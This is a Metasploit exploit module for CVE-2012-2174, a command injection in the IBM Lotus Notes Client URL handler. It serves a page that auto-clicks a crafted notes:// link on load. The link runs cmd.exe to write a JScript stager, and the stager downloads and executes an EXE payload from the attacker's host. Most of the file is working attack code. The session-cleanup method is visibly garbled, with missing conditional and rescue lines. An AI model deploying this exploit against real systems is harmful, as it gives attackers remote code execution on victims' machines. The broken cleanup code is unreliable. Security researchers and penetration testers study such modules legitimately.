# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = ExcellentRanking
 
    include Msf::Exploit::Remote::HttpServer::HTML
    include Msf::Exploit::EXE
    include Msf::Exploit::FileDropper
 
    def initialize(info={})
        super(update_info(info,
            &#039;Name&#039;           => "IBM Lotus Notes Client URL Handler Command Injection",
            &#039;Description&#039;    => %q{
                    This modules exploits a command injection vulnerability in the URL handler for
                for the IBM Lotus Notes Client <= 8.5.3. The registered handler can be abused with
                an specially crafted notes:// URL to execute arbitrary commands with also arbitrary
                arguments. This module has been tested successfully on Windows XP SP3 with IE8,
                Google Chrome 23.0.1271.97 m and IBM Lotus Notes Client 8.5.2.
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Author&#039;         =>
                [
                    &#039;Moritz Jodeit&#039;, # Vulnerability discovery
                    &#039;Sean de Regge&#039;, # Vulnerability analysis
                    &#039;juan vazquez&#039; # Metasploit
                ],
            &#039;References&#039;     =>
                [
                    [ &#039;CVE&#039;, &#039;2012-2174&#039; ],
                    [ &#039;OSVDB&#039;, &#039;83063&#039; ],
                    [ &#039;BID&#039;, &#039;54070&#039; ],
                    [ &#039;URL&#039;, &#039;http://www.zerodayinitiative.com/advisories/ZDI-12-154/&#039; ],
                    [ &#039;URL&#039;, &#039;http://pwnanisec.blogspot.com/2012/10/exploiting-command-injection.html&#039; ],
                    [ &#039;URL&#039;, &#039;http://www-304.ibm.com/support/docview.wss?uid=swg21598348&#039; ]
                ],
            &#039;Payload&#039;        =>
                {
                    &#039;Space&#039;           => 2048,
                    &#039;StackAdjustment&#039; => -3500
                },
            &#039;DefaultOptions&#039;  =>
                {
                    &#039;EXITFUNC&#039;         => "none",
                    &#039;InitialAutoRunScript&#039; => &#039;migrate -k -f&#039;
                },
            &#039;Platform&#039;       => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                    [ &#039;Automatic&#039;, {} ]
                ],
            &#039;Privileged&#039;     => false,
            &#039;DisclosureDate&#039; => "Jun 18 2012",
            &#039;DefaultTarget&#039;  => 0))
 
        register_options(
            [
                OptBool.new(&#039;OBFUSCATE&#039;, [false, &#039;Enable JavaScript obfuscation&#039;, false])
            ], self.class)
    end
 
    def exploit
        @exe_name = rand_text_alpha(2) + ".exe"
        @stage_name = rand_text_alpha(2) + ".js"
        super
    end
 
    def on_new_session(session)
            session.core.use("stdapi") unless session.ext.aliases.include?("stdapi")
        end
 
        @dropped_files.delete_if do |file|
            win_file = file.gsub("/", "\\\\")
                begin
                    wintemp = session.fs.file.expand_path("%TEMP%")
                    win_file = "#{wintemp}\\#{win_file}"
                    # fs.file.rm().  Until that has been implemented, remove the
                    # read-only flag with a command.
                    session.shell_command_token(%Q|attrib.exe -r "#{win_file}"|)
                    session.fs.file.rm(win_file)
                    print_good("Deleted #{file}")
                    true
                    print_error("Failed to delete #{win_file}")
                    false
                end
 
            end
        end
 
    end
 
    def on_request_uri(cli, request)
 
        if request.uri =~ /\.exe$/
            return if ((p=regenerate_payload(cli))==nil)
            register_file_for_cleanup("#{@stage_name}") unless @dropped_files and @dropped_files.include?("#{@stage_name}")
            register_file_for_cleanup("#{@exe_name}") unless @dropped_files and @dropped_files.include?("#{@exe_name}")
            data = generate_payload_exe({:code=>p.encoded})
            print_status("Sending payload")
            send_response(cli, data, {&#039;Content-Type&#039;=>&#039;application/octet-stream&#039;})
            return
        end
 
        my_host = (datastore[&#039;SRVHOST&#039;] == &#039;0.0.0.0&#039;) ? Rex::Socket.source_address(cli.peerhost) : datastore[&#039;SRVHOST&#039;]
        if datastore[&#039;SSL&#039;]
            schema = "https"
        else
            schema = "http"
        end
        uri = "#{schema}://#{my_host}"
        uri << ":#{datastore[&#039;SRVPORT&#039;]}#{get_resource()}/#{rand_text_alpha(rand(6)+3)}.exe"
 
        script = "var w=new ActiveXObject(&#039;wscript.shell&#039;);"
        script << "w.CurrentDirectory=w.ExpandEnvironmentStrings(&#039;\\%TEMP\\%&#039;);"
        script << "var x=new ActiveXObject(&#039;Microsoft.XMLHTTP&#039;);"
        script << "x.open(&#039;GET&#039;,&#039;#{uri}&#039;, false);"
        script << "x.send();"
        script << "var s=new ActiveXObject(&#039;ADODB.Stream&#039;);"
        script << "s.Mode=3;"
        script << "s.Type=1;"
        script << "s.Open();"
        script << "s.Write(x.responseBody);"
        script << "s.SaveToFile(&#039;#{@exe_name}&#039;,2);"
        script << "w.Run(&#039;#{@exe_name}&#039;);"
 
        vmargs = "/q /s /c echo #{script} > %TEMP%\\\\#{@stage_name}& start cscript %TEMP%\\\\#{@stage_name}& REM"
 
        link_id = rand_text_alpha(5 + rand(5))
 
        js_click_link = %Q|
        function clickLink(link) {
            var cancelled = false;
 
            if (document.createEvent) {
                var event = document.createEvent("MouseEvents");
                event.initMouseEvent("click", true, true, window,
                    0, 0, 0, 0, 0,
                    false, false, false, false,
                    0, null);
                cancelled = !link.dispatchEvent(event);
            }
            else if (link.fireEvent) {
                cancelled = !link.fireEvent("onclick");
            }
 
            if (!cancelled) {
                window.location = link.href;
            }
        }
        |
 
        if datastore[&#039;OBFUSCATE&#039;]
            js_click_link = ::Rex::Exploitation::JSObfu.new(js_click_link)
            js_click_link.obfuscate
            js_click_link_fn = js_click_link.sym(&#039;clickLink&#039;)
        else
            js_click_link_fn = &#039;clickLink&#039;
        end
 
 
        html = <<-EOS
        <html>
        <head>
        <script>
        #{js_click_link}
        </script>
        </head>
        <body onload="#{js_click_link_fn}(document.getElementById(&#039;#{link_id}&#039;));">
        <a id="#{link_id}" href="notes://#{rand_text_alpha_upper(3+rand(3))}/#{rand_text_alpha_lower(3+rand(3))} -RPARAMS java -vm c:\\windows\\system32\\cmd.exe -vmargs #{vmargs}"></a>
        </body>
        </html>
        EOS
 
        print_status("Sending html")
        send_response(cli, html, {&#039;Content-Type&#039;=>&#039;text/html&#039;})
 
    end
 
end

